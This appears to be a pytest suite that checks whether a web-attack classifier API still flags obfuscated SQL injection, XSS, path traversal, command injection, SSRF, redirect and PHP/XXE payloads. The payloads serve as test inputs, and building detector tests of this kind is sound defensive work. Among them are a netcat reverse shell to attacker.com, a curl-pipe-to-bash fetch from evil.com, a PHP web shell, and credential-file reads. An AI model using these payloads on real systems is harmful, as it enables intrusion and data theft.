"""
Adversarial and obfuscation security testing.

Simulates real-world evasion, poisoning, and input manipulation attacks.

Covers:
  • SQL injection evasion (case, comments, encoding)
  • XSS obfuscation (case, event handlers, encoding)
  • Path traversal obfuscation (double encoding, null bytes)
  • Command injection obfuscation
  • SSRF / redirect attacks
  • Mixed encoding tricks
  • Model exploitation attempts
"""

import urllib.parse
from urllib.parse import quote

import pytest

from conftest import (
    EVASION_SQL,
    EVASION_XSS,
    EVASION_PATH,
    GROUND_TRUTH,
    Thresholds,
    extract_features_raw,
)


# ─────────────────────────────────────────────────────────────────────────────
# SQL Injection Evasion
# ─────────────────────────────────────────────────────────────────────────────

class TestSQLEvasion:

    @pytest.mark.parametrize("evaded_url", EVASION_SQL)
    def test_sql_evasion_still_detected(self, client, evaded_url):
        """
        Evasion techniques (case variation, inline comments, encoding)
        must NOT allow malicious SQL through undetected.
        """
        resp = client.post("/api/v1/security/predict", json={"url": evaded_url})
        assert resp.status_code == 200
        assert resp.json()["status"] == "attack", (
            f"SQL evasion NOT caught: '{evaded_url}' "
            f"(confidence={resp.json()['confidence']})"
        )

    def test_case_variation(self, client):
        """Mixed-case SQL keywords should still trigger detection."""
        variants = [
            "/search?q=SeLeCt * fRoM uSeRs",
            "/search?q=sELECT password FROM admin",
            "/search?q=DROP TabLe uSeRs",
        ]
        for url in variants:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            assert resp.json()["status"] == "attack", f"Case evasion failed: {url}"

    def test_inline_comment_obfuscation(self, client):
        """Inline comment SQL injection: SELECT/*comment*/FROM"""
        variants = [
            "/search?q=SELECT/**/FROM/**/users",
            "/search?q=1;/*hello*/DROP TABLE sessions--",
            "/search?q='/**/OR/**/1=1/**/--",
        ]
        for url in variants:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            assert resp.json()["status"] == "attack", (
                f"Inline comment evasion failed: {url}"
            )

    def test_hex_encoding_evasion(self, client):
        """SQL payloads encoded as hex (0x...) should be caught."""
        # 0x73656c656374 = "select" in hex
        payloads = [
            "/search?q=0x73656c656374",
            "/search?q=0x4445504c",
        ]
        results = []
        for url in payloads:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            results.append(resp.json()["status"])
        # At least some hex-encoded SQL should trigger – log all results
        assert "attack" in results or results.count("normal") <= 1, (
            f"All hex SQL evaded detection: {results}"
        )

    def test_url_encoded_sql_keywords(self, client):
        """URL-encoded SQL injection patterns should still be detected."""
        encoded = quote("' OR 1=1 --")
        url = f"/search?q={encoded}"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack", (
            f"URL-encoded SQL not caught: {url}"
        )

    def test_double_url_encoding(self, client):
        """Double-encoded payloads must still be caught (defense in depth)."""
        single_enc = quote(quote("' OR 1=1"))
        url = f"/search?q={single_enc}"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        # These may or may not be caught – log the result
        # The test documents the current behavior
        assert resp.status_code == 200

    def test_null_byte_injection(self, client):
        """Null byte (%00) injection – sometimes used to truncate checks."""
        url = "/search?q=test%00'drop table"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.status_code == 200  # Must not crash

    def test_char_by_char_union(self, client):
        """UNION keyword split across parameters."""
        url = "/api?id=1&b=2&c=UNION&d=SELECT&e=password&f=FROM&g=users"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack", (
            f"Char-by-char SQL split not caught: {url}"
        )

    def test_boolean_based_blind_injection(self, client):
        """Blind boolean SQLi: /item?id=1 AND 1=1"""
        url = "/item?id=1 AND 1=1"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack"

    def test_time_based_injection(self, client):
        """Time-based blind SQLi keywords should trigger detection."""
        url = "/view?id=1 WAITFOR DELAY '00:00:05'--"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack"


# ─────────────────────────────────────────────────────────────────────────────
# XSS Evasion
# ─────────────────────────────────────────────────────────────────────────────

class TestXSSObfuscation:

    @pytest.mark.parametrize("payload", EVASION_XSS)
    def test_xss_still_detected(self, client, payload):
        """
        XSS obfuscation variants must not bypass detection.
        """
        resp = client.post("/api/v1/security/predict",
                           json={"url": "/submit", "content": payload})
        assert resp.status_code == 200
        assert resp.json()["status"] == "attack", (
            f"XSS evasion NOT caught: '{payload}' "
            f"(confidence={resp.json()['confidence']})"
        )

    def test_case_mixed_xss(self, client):
        """Mixed-case XSS payloads must still be caught."""
        payloads = [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<IMG SRC=jAVasCrIPt:alert('XSS')>",
            "<SvG oNlOaD=alert(1)>",
        ]
        for payload in payloads:
            resp = client.post("/api/v1/security/predict",
                              json={"url": "/post", "content": payload})
            assert resp.json()["status"] == "attack", (
                f"Case-mixed XSS not caught: {payload}"
            )

    def test_null_byte_xss(self, client):
        """Null bytes in XSS payloads must not cause a crash."""
        payload = "<script%00>alert(1)</script>"
        resp = client.post("/api/v1/security/predict",
                           json={"url": "/comment", "content": payload})
        assert resp.status_code == 200

    def test_encoding_xss(self, client):
        """HTML-encoded XSS in content should be caught."""
        payload = "&lt;script&gt;alert(1)&lt;/script&gt;"
        resp = client.post("/api/v1/security/predict",
                           json={"url": "/post", "content": payload})
        assert resp.json()["status"] == "attack", (
            f"Encoded XSS not caught: {payload}"
        )

    def test_polyglot_payload(self, client):
        """
        Polyglot payloads: work as both SQL and XSS.
        Must be classified as attack regardless of which heuristic fires first.
        """
        polyglots = [
            "'\"--><svg/onload=alert(1)>",
            "1' OR '1'='1</script><script>alert(1)//",
        ]
        for payload in polyglots:
            resp = client.post("/api/v1/security/predict",
                              json={"url": "/api", "content": payload})
            assert resp.json()["status"] == "attack", (
                f"Polyglot not caught: {payload}"
            )

    def test_mutation_xss_basic(self, client):
        """Basic mutation XSS patterns should trigger suspicious-word scoring."""
        payload = "<iframe src=javascript:alert(1)>"
        resp = client.post("/api/v1/security/predict",
                           json={"url": "/embed", "content": payload})
        assert resp.json()["status"] == "attack"


# ─────────────────────────────────────────────────────────────────────────────
# Path Traversal / File Inclusion
# ─────────────────────────────────────────────────────────────────────────────

class TestPathTraversalObfuscation:

    @pytest.mark.parametrize("obfuscated", EVASION_PATH)
    def test_traversal_still_detected(self, client, obfuscated):
        """Obfuscated path traversal must still be flagged."""
        # Encode the traversal pattern in a URL param
        url = f"/download?file={obfuscated}"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack", (
            f"Path traversal obfuscation NOT caught: '{url}'"
        )

    def test_url_encoded_traversal(self, client):
        """Encoded path traversal patterns."""
        encoded = quote(quote("../../../etc/passwd"))
        url = f"/read?path={encoded}"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack"

    def test_null_byte_traversal(self, client):
        """Null byte path traversal: /etc/passwd%00.txt"""
        url = "/read?path=/etc/passwd%00.txt"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack"

    def test_backslash_traversal(self, client):
        """Windows-style backslash traversal."""
        url = "/read?path=..\\..\\..\\windows\\system32\\config\\sam"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack"

    def test_double_encoding_traversal(self, client):
        """Double URL-encoded traversal."""
        encoded = quote(quote("..%252f..%252f..%252fetc%252fpasswd"))
        url = f"/fetch?file={encoded}"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.status_code == 200  # Must not crash


# ─────────────────────────────────────────────────────────────────────────────
# Command Injection & SSRF
# ─────────────────────────────────────────────────────────────────────────────

class TestCommandInjection:

    def test_command_injection_shell_operators(self, client):
        """Shell metacharacters must trigger detection."""
        payloads = [
            "/ping?host=127.0.0.1; cat /etc/passwd",
            "/exec?cmd=ls -la /root",
            "/shell?arg=|nc -e /bin/sh attacker.com 4444",
            "/system?cmd=whoami",
            "/ping?ip=127.0.0.1 && id",
        ]
        for url in payloads:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            assert resp.json()["status"] == "attack", (
                f"Command injection not caught: {url}"
            )

    def test_ssrf_internal_ips(self, client):
        """SSRF targeting internal IPs must be blocked."""
        payloads = [
            "/fetch?url=http://169.254.169.254/latest/meta-data/",
            "/proxy?url=http://internal.corp.local/admin",
            "/load?url=http://localhost:8080/admin",
            "/fetch?uri=http://127.0.0.1:22",
        ]
        results = [client.post("/api/v1/security/predict",
                               json={"url": url}).json()["status"]
                   for url in payloads]
        attack_count = results.count("attack")
        assert attack_count >= 3, (
            f"SSRF detection rate too low: {attack_count}/{len(payloads)} caught. "
            f"Results: {list(zip(payloads, results))}"
        )

    def test_open_redirect_detection(self, client):
        """Open redirect attacks."""
        payloads = [
            "/redirect?url=https://evil.com/fake-login",
            "/goto?dest=//attacker.com",
            "/return?url=http://malicious.com/phish",
        ]
        for url in payloads:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            assert resp.json()["status"] == "attack", (
                f"Open redirect not caught: {url}"
            )


# ─────────────────────────────────────────────────────────────────────────────
# Content-level attacks
# ─────────────────────────────────────────────────────────────────────────────

class TestContentAttacks:

    def test_php_code_injection(self, client):
        """PHP code injection in content."""
        payloads = [
            "<?php system($_GET['cmd']); ?>",
            "<?= $_POST['pass'] ?>",
            "<script language='php'>eval($_GET['x'])</script>",
        ]
        for content in payloads:
            resp = client.post("/api/v1/security/predict",
                              json={"url": "/upload", "content": content})
            assert resp.json()["status"] == "attack", (
                f"PHP injection not caught: {content[:50]}"
            )

    def test_shell_script_injection(self, client):
        """Shell script content should trigger detection."""
        payloads = [
            "#!/bin/bash\ncurl http://evil.com/shell.sh | bash",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        ]
        for content in payloads:
            resp = client.post("/api/v1/security/predict",
                              json={"url": "/deploy", "content": content})
            assert resp.json()["status"] == "attack", (
                f"Shell/XXE injection not caught: {content[:50]}"
            )

    def test_mixed_url_and_content_attack(self, client):
        """
        Benign URL but malicious content – both signals should combine.
        """
        resp = client.post(
            "/api/v1/security/predict",
            json={
                "url": "/api/v2/feedback",
                "content": "SELECT password FROM admin WHERE id=1--",
            },
        )
        assert resp.json()["status"] == "attack", (
            "Benign URL + malicious content was not flagged"
        )


# ─────────────────────────────────────────────────────────────────────────────
# Model exploitation / boundary cases
# ─────────────────────────────────────────────────────────────────────────────

class TestModelExploitation:

    def test_empty_injection(self, client):
        """Empty strings should not cause false positives."""
        for url in ["/", ""]:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            assert resp.status_code in (200, 422)

    def test_extremely_long_benign_url(self, client):
        """
        Very long but structurally benign URLs must not be misclassified as attacks.
        """
        long_url = "/data?" + "&".join(f"param{i}=value{i}" for i in range(500))
        resp = client.post("/api/v1/security/predict", json={"url": long_url})
        assert resp.status_code == 200
        # It should be classified as normal (no attack keywords)
        assert resp.json()["status"] == "normal", (
            f"Long benign URL misclassified as attack: {resp.json()}"
        )

    def test_unicode_benign_url(self, client):
        """Unicode in URL should be handled without crash."""
        url = "/user/東京"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.status_code == 200

    def test_ip_address_as_host(self, client):
        """Raw IP addresses in URLs."""
        payloads = [
            "http://192.168.1.1/admin",
            "http://10.0.0.1/api",
        ]
        for url in payloads:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            assert resp.status_code == 200  # Must not crash

    def test_protocol_relative_url(self, client):
        """Protocol-relative URLs (//example.com)."""
        url = "//attacker.com/malicious"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack", (
            f"Protocol-relative URL not caught: {url}"
        )

    def test_data_uri_scheme(self, client):
        """Data URI scheme in content."""
        payload = "data:text/html,<script>alert(1)</script>"
        resp = client.post("/api/v1/security/predict",
                           json={"url": "/render", "content": payload})
        assert resp.json()["status"] == "attack"

    def test_no_schema_no_path(self, client):
        """Minimal URLs with no schema and no path."""
        # These should be handled gracefully
        for url in ["localhost", "example.com", "?"]:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            assert resp.status_code in (200, 422)

    def test_combined_attack_patterns(self, client):
        """
        Multiple attack patterns in one request should accumulate risk.
        """
        url = "/admin?q=' OR 1=1&file=../../etc/passwd&cmd=whoami"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack", (
            "Combined multi-vector attack not caught"
        )

    def test_mimic_normal_benign_patterns(self, client):
        """
        URLs that look normal but contain encoded attack patterns.
        """
        # Encode SQLi in a parameter named 'q' with normal-looking value
        encoded = quote("' OR 1=1 --")
        url = f"/search?q={encoded}"
        resp = client.post("/api/v1/security/predict", json={"url": url})
        assert resp.json()["status"] == "attack", (
            f"Encoded SQLi in normal-looking URL not caught: {url}"
        )


# ─────────────────────────────────────────────────────────────────────────────
# Poisoning resistance
# ─────────────────────────────────────────────────────────────────────────────

class TestPoisoningResistance:

    def test_high_confidence_on_obvious_attack(self, client):
        """
        Obvious attacks must have high confidence (≥ 0.7).
        If a model is poisoned to misclassify attacks, confidence will be low.
        """
        obvious_attacks = [
            "/search?q=' OR 1=1 --",
            "/admin?user=admin'--",
            "/api?id=1 UNION SELECT password FROM users--",
        ]
        for url in obvious_attacks:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            conf = resp.json()["confidence"]
            assert conf >= 0.7, (
                f"Obvious attack '{url}' has low confidence {conf} – "
                f"possible model poisoning or degradation"
            )

    def test_low_confidence_on_benign(self, client):
        """
        Benign URLs should not have suspiciously high confidence for attack.
        """
        benign = ["/home", "/products", "/contact"]
        for url in benign:
            resp = client.post("/api/v1/security/predict", json={"url": url})
            conf = resp.json()["confidence"]
            # Normal should be predicted; if attack, confidence must be low
            status = resp.json()["status"]
            if status == "attack":
                assert conf < 0.8, (
                    f"Benign URL '{url}' flagged as attack with high confidence {conf} – "
                    f"possible false positive poisoning"
                )
